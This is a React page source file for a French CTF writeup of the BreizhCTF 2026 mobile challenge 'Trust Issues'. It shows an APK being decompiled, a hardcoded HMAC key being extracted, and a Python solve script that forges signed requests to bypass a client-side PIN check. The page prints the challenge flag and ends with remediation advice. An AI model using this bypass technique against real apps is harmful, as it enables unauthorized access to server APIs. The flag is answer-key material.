import { Smartphone, Key, Shield, Zap, Heart, Lock, Binary } from "lucide-react";
import { RevealFlagBlock } from "@/components/RevealFlag";
import { PageHeader } from "@/components/PageHeader";

function CodeBlock({
  children,
  title,
  result,
}: {
  children: string;
  title?: string;
  result?: boolean;
}) {
  const label = result ? "Résultat" : title;
  return (
    <div className="my-4">
      {label && (
        <p className={`mb-1 text-xs font-mono ${result ? "text-primary" : "text-muted-foreground"}`}>
          {label}
        </p>
      )}
      <pre className="overflow-x-auto rounded-lg border border-border bg-card p-4 font-mono text-sm text-muted-foreground">
        <code className="whitespace-pre">{children}</code>
      </pre>
    </div>
  );
}

function InfoBox({ children }: { children: React.ReactNode }) {
  return (
    <div className="my-4 rounded-lg border border-primary/30 bg-primary/5 px-5 py-4 text-sm text-muted-foreground">
      {children}
    </div>
  );
}

export const metadata = {
  title: "Trust Issues - BreizhCTF 2026 | 0xbbuddha",
  description:
    "Writeup Trust Issues (BreizhCTF 2026, Mobile) : reverse APK Android avec jadx, extraction d'une clé HMAC hardcodée splitée en 4 tableaux, bypass de la vérification PIN côté client.",
};

export default function WriteupTrustIssuesPage() {
  return (
    <div className="mx-auto max-w-4xl px-4 py-8 sm:px-6 lg:px-10 lg:py-10">
      <PageHeader
        eyebrow="Writeup"
        title="Trust Issues - BreizhCTF 2026"
        description="Une app Android pour gérer les flags du CTF. Credentials fournis : player / ctf2026. La clé HMAC pour signer les requêtes est hardcodée dans le binaire, splitée en 4 tableaux pour faire joli. Et la vérification PIN ? Uniquement côté client."
        breadcrumbs={[
          { label: "README", href: "/" },
          { label: "Writeups", href: "/writeups" },
          { label: "Trust Issues" },
        ]}
        stats={[
          { label: "CTF", value: "BreizhCTF 2026" },
          { label: "Catégorie", value: "Mobile" },
          { label: "Date", value: "2026-05-22" },
        ]}
      />

      <article className="mt-8 space-y-12">

        <section className="rounded-lg border border-primary/20 bg-primary/5 p-6">
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Heart className="size-5 text-primary" />
            Contexte
          </h2>
          <p className="text-muted-foreground mb-3">
            Un APK Android avec des credentials fournis. Mon premier réflexe : lancer{" "}
            <code className="rounded bg-muted px-1">jadx</code> et lire le code Java
            décompilé. La logique réseau est souvent la plus révélatrice dans ce type de challenge.
          </p>
          <p className="text-muted-foreground mb-3">
            En quelques minutes, j&apos;ai identifié trois fichiers intéressants :{" "}
            <code className="rounded bg-muted px-1">ApiConfig.java</code> pour l&apos;URL de base,{" "}
            <code className="rounded bg-muted px-1">ApiClient.java</code> pour la logique réseau,
            et <code className="rounded bg-muted px-1">PinManager.java</code> pour la gestion du PIN.
          </p>
          <p className="text-muted-foreground">
            Dans <code className="rounded bg-muted px-1">ApiClient.java</code>, j&apos;ai vu une
            clé HMAC découpée en quatre tableaux. Et dans{" "}
            <code className="rounded bg-muted px-1">PinManager.java</code>, un simple booléen
            en mémoire. La suite était évidente.
          </p>
        </section>

        <section className="rounded-lg border border-primary/20 bg-primary/5 p-6">
          <div className="flex items-center gap-2 mb-2">
            <Zap className="size-5 text-primary" />
            <span className="font-mono text-sm font-semibold text-primary">Flag</span>
          </div>
          <RevealFlagBlock title="Flag">
{`BZHCTF{4i_&_cl13nt_s1d3_ch3cks_4r3_n0t_s3cur1ty}`}
          </RevealFlagBlock>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Smartphone className="size-5 text-primary" />
            1. Reconnaissance
          </h2>
          <p className="text-muted-foreground mb-3">
            Première étape : identifier le fichier et décompiler.
          </p>
          <CodeBlock title="Identification et décompilation">
{`$ file trust-issues.apk
trust-issues.apk: Zip archive data

$ jadx -d trust_jadx/ trust-issues.apk`}
          </CodeBlock>
          <p className="text-muted-foreground mb-3">
            Le package principal est <code className="rounded bg-muted px-1">com.breizhctf.trustissues</code>.
            La structure qui m&apos;intéresse :
          </p>
          <CodeBlock title="Fichiers pertinents">
{`api/ApiConfig.java   -> URL de base
api/ApiClient.java   -> logique réseau (login, pin, flag)
api/PinManager.java  -> état de la vérification PIN`}
          </CodeBlock>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Key className="size-5 text-primary" />
            2. Analyse statique
          </h2>

          <h3 className="mb-2 font-mono font-semibold text-foreground">La clé HMAC hardcodée</h3>
          <p className="text-muted-foreground mb-3">
            Dans <code className="rounded bg-muted px-1">ApiClient.java</code>, la clé est
            découpée en quatre tableaux de 8 octets. C&apos;est une tentative d&apos;obscurcissement
            pour qu&apos;elle ne ressorte pas directement dans une recherche de strings :
          </p>
          <CodeBlock title="ApiClient.java - clé HMAC">
{`private static final byte[] _k0 = {-115, -34, 107, -68, 44, 91, 35, 42};
private static final byte[] _k1 = {-26, -49, -76, -15, 18, 120, -85, 100};
private static final byte[] _k2 = {-29, 33, -3, 54, 111, -1, 55, -85};
private static final byte[] _k3 = {-56, 119, -78, -44, -116, 110, -34, 29};

private final byte[] getVerifyKey() {
    return ArraysKt.plus(ArraysKt.plus(ArraysKt.plus(_k0, _k1), _k2), _k3);
}`}
          </CodeBlock>
          <p className="text-muted-foreground mb-3">
            Java utilise des bytes signés, Python des bytes non signés. Je reconstitue la clé
            en appliquant <code className="rounded bg-muted px-1">b & 0xFF</code> sur chaque valeur.
          </p>

          <h3 className="mb-2 mt-6 font-mono font-semibold text-foreground">
            Le header X-Verify-Token
          </h3>
          <p className="text-muted-foreground mb-3">
            La requête vers <code className="rounded bg-muted px-1">/admin/flag</code> exige
            un header signé :
          </p>
          <CodeBlock title="ApiClient.java - construction du token">
{`private final String computeVerifyToken(String token, String endpoint) {
    Mac mac = Mac.getInstance("HmacSHA256");
    mac.init(new SecretKeySpec(getVerifyKey(), "HmacSHA256"));
    String data = token + ":" + endpoint;
    return mac.doFinal(data.getBytes(UTF_8));  // encodé en hex
}

// Requête finale :
Request request = new Request.Builder()
    .url(BASE_URL + "/admin/flag")
    .header("Authorization", "Bearer " + token)
    .header("X-Verify-Token", verifyToken)
    .build();`}
          </CodeBlock>

          <h3 className="mb-2 mt-6 font-mono font-semibold text-foreground">
            La vérification PIN côté client uniquement
          </h3>
          <p className="text-muted-foreground mb-3">
            Avant d&apos;appeler <code className="rounded bg-muted px-1">/admin/flag</code>,
            l&apos;app vérifie un PIN. Mais cette vérification est purement en mémoire :
          </p>
          <CodeBlock title="ApiClient.java - garde-fou PIN">
{`if (!PinManager.INSTANCE.isVerified()) {
    return "PIN verification required";
}`}
          </CodeBlock>
          <InfoBox>
            Le serveur ne sait pas si le PIN a été vérifié. Ce garde-fou n&apos;existe que dans
            l&apos;app. Si j&apos;appelle directement l&apos;API avec le bon token et le bon
            X-Verify-Token, le serveur répond normalement - sans aucune mention du PIN.
          </InfoBox>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Lock className="size-5 text-primary" />
            3. Exploitation
          </h2>
          <p className="text-muted-foreground mb-3">
            Le chemin est direct : login pour obtenir un JWT, calcul du{" "}
            <code className="rounded bg-muted px-1">X-Verify-Token</code>, appel direct à{" "}
            <code className="rounded bg-muted px-1">/admin/flag</code> sans passer par l&apos;app.
          </p>
          <CodeBlock title="solve.py">
{`import hmac, hashlib, json, urllib.request

# Reconstruction de la clé (bytes Java signés -> Python non signés)
def jbyte(b): return b & 0xFF

k0 = bytes([jbyte(x) for x in [-115, -34, 107, -68, 44, 91, 35, 42]])
k1 = bytes([jbyte(x) for x in [-26, -49, -76, -15, 18, 120, -85, 100]])
k2 = bytes([jbyte(x) for x in [-29, 33, -3, 54, 111, -1, 55, -85]])
k3 = bytes([jbyte(x) for x in [-56, 119, -78, -44, -116, 110, -34, 29]])
key = k0 + k1 + k2 + k3

BASE = "https://i-have-trust-issues.ctf.bzh"

# 1. Login avec les credentials fournis
login_data = json.dumps({"username": "player", "password": "ctf2026"}).encode()
req = urllib.request.Request(
    BASE + "/login",
    data=login_data,
    headers={"Content-Type": "application/json"},
    method="POST",
)
with urllib.request.urlopen(req) as r:
    token = json.loads(r.read())["token"]

# 2. Calcul du X-Verify-Token
verify_token = hmac.new(
    key,
    (token + ":/admin/flag").encode(),
    hashlib.sha256,
).hexdigest()

# 3. Appel direct sans passer par la vérification PIN
req2 = urllib.request.Request(
    BASE + "/admin/flag",
    headers={
        "Authorization": f"Bearer {token}",
        "X-Verify-Token": verify_token,
    },
)
with urllib.request.urlopen(req2) as r:
    print(json.loads(r.read())["flag"])`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`BZHCTF{4i_&_cl13nt_s1d3_ch3cks_4r3_n0t_s3cur1ty}`}
          </CodeBlock>
        </section>

        <section className="rounded-lg border border-border bg-card p-6">
          <h2 className="mb-3 font-mono font-semibold text-primary">
            <Binary className="size-4 text-primary inline mr-2" />
            Ce que j&apos;en retiens
          </h2>
          <ul className="space-y-2 text-sm text-muted-foreground">
            <li>
              <strong>Une clé secrète dans un binaire distribué n&apos;est pas un secret.</strong>{" "}
              Peu importe qu&apos;elle soit splitée en 4 tableaux ou obfusquée d&apos;une autre
              façon - jadx la décompile et je la reconstitue en 3 lignes Python.
            </li>
            <li>
              <strong>Les checks côté client ne protègent pas le serveur.</strong> La vérification
              PIN ne sert qu&apos;à l&apos;UX - le serveur n&apos;a aucun moyen de savoir si
              elle a été faite ou non. N&apos;importe quelle requête directe avec les bons headers
              passe.
            </li>
            <li>
              <strong>jadx est très efficace</strong> sur les APKs non obfusqués. En moins de
              5 minutes j&apos;avais toute la logique d&apos;auth sous les yeux, bien plus lisible
              que du bytecode brut.
            </li>
          </ul>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Shield className="size-5 text-primary" />
            Comment le corriger
          </h2>
          <p className="text-muted-foreground mb-3">
            Deux corrections indépendantes, chacune suffisante pour fermer une des deux failles :
          </p>
          <ul className="list-disc list-inside space-y-2 text-sm text-muted-foreground">
            <li>
              <strong>Pour le PIN</strong> : le lier à la session côté serveur. À la vérification
              PIN réussie, le serveur émet un token de session supplémentaire. Sans ce token,
              l&apos;accès à <code className="rounded bg-muted px-1">/admin/flag</code> est refusé.
            </li>
            <li>
              <strong>Pour la clé HMAC</strong> : ne jamais embarquer un secret cryptographique
              dans un binaire distribué. La clé doit être dérivée d&apos;un secret serveur,
              échangée dynamiquement (OAuth PKCE, JWT signé côté serveur, etc.).
            </li>
          </ul>
        </section>

      </article>
    </div>
  );
}
